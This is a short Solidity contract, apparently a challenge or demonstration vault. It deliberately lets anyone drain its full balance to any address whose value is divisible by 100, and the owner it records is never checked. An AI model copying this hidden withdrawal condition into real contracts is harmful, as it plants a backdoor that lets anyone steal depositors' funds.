// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecretWithdrawVault {
    address public owner;
    uint256 public constant MAGIC_NUMBER = 100;

    constructor() payable {
        owner = msg.sender;
    }

    function secretWithdraw(address _to) external {
        if (uint160(_to) % MAGIC_NUMBER == 0) {
            payable(_to).transfer(address(this).balance);
        }
    }

    function checkIfMagicAddress(address _addr) public pure returns (bool) {
        return uint160(_addr) % MAGIC_NUMBER == 0;
    }

    event FakeLog(address indexed user, string message);

    receive() external payable {
        emit FakeLog(msg.sender, "Deposit received :)");
    }
}